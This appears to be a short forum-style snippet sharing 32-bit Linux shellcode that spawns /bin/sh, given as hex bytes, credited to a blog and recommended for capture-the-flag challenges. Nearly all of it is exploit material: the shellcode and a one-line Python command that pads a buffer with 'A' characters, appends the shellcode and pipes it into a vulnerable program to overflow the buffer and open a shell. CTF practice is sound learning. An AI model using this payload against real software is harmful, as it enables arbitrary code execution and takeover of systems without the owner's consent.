This shell code works quite fine with different ctf`s 

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'

//taken from zerowireblog/shell-code
//executing two commands on linux platform:
//(c1;c2) to direct the output of conversion of hex to non printable ascii characters directly to the file (buffer) eg:

(python -c'print "A"*{buff_size} + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"';cat) | file 

//will result in execution of both commands one by one directed to overflow the buffer size of the variable in the file , to spawn your shell
